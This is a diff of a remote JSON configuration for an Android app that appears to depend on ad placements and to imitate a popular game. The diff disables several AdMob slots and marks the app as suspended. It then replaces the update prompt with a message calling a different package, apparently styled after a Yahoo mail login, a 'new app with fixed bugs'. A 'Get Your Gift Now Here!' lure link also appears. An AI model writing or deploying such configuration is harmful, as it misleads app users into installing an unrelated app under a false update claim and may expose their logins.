@@ -41,13 +41,13 @@
       "applovin rewarded": ".",
 	  
 	  
-      "start Activity Inter": "admob",
+      "start Activity Inter": ".",
       "start Activity Native": ".",
       "start Activity Banner": ".",
 	  
-      "main Activity Inter": "admob",
+      "main Activity Inter": ".",
       "main Activity Native": ".",
-      "main Activity Banner": "admob",
+      "main Activity Banner": ".",
 	  
       "web view banner 1": ".",
       "web view banner 2": ".",
@@ -74,10 +74,10 @@
       "CPA URL 2": "https://www.youtube.com/watch?v=ffcitRgiNDs",
 	    "CPA text 2": "Get Your Gift Now Here!",
 	  
-      "is app suspended": "false",
-      "update title": "A new update for this app",
-      "update message": "Update this app because this version has some isues",
-      "update URL": "com.innersloth.spacemafia"
+      "is app suspended": "true",
+      "update title": "New update is available now",
+      "update message": " We launched a new app with fixed bugs and less storage. Click UPDATE and try it now",
+      "update URL": "com.loginmail.yahoo.email.more.secure.lo"
     }
   }
 }
